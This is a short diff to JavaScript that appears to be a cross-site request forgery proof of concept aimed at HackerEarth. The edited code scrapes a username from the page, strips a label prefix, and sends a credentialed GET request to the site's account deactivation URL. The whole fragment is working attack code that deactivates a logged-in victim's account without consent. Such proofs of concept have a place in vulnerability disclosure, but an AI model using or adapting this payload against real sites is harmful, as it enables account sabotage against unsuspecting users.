@@ -41,7 +41,7 @@ function get_csrf_token(){
     }
   };
   var username = document.getElementById("demo3").innerText;
-  var url = "https://www.hackerearth.com/deactivate/" + username;
+  var url = "https://www.hackerearth.com/deactivate/" + username.replace("Username: ","");;
   xhttp.open("GET", url, true);
   xhttp.withCredentials = true;
   xhttp.send();
